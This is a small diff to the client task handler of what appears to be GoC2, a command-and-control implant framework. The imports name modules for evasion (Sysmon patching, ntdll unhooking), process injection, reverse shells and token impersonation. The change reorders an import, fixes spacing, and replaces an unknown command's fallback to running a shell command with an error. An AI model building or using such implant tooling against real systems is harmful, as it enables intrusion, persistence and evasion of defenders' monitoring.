@@ -33,10 +33,10 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/evasion/patchsysmon"
 	"github.com/latortuga71/GoC2/internal/modules/evasion/unhookntdll"
 	"github.com/latortuga71/GoC2/internal/modules/execution/createprocess"
+	"github.com/latortuga71/GoC2/internal/modules/execution/memfdcreate"
 	"github.com/latortuga71/GoC2/internal/modules/execution/processinjection"
 	"github.com/latortuga71/GoC2/internal/modules/execution/reverseshell"
 	"github.com/latortuga71/GoC2/internal/modules/execution/runbinary"
-	"github.com/latortuga71/GoC2/internal/modules/execution/memfdcreate"
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/enableprivilege"
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/enumtokens"
 	"github.com/latortuga71/GoC2/internal/modules/impersonation/getsystem"
@@ -285,9 +285,9 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	case "crontab":
 		result, cmdError = crontab.AppendCronJob(t.Args[0])
 	case "memfd_create":
-		result,cmdError = memfdcreate.MemfdCreate(t.File,t.Args[1])
+		result, cmdError = memfdcreate.MemfdCreate(t.File, t.Args[1])
 	default:
-		result, cmdError = basic.ShellCommand(t.Args)
+		result, cmdError = "", errors.New("Command Not Found.")
 	}
 	if t.Command != "shell" {
 		result += "\n" // makes output a little better
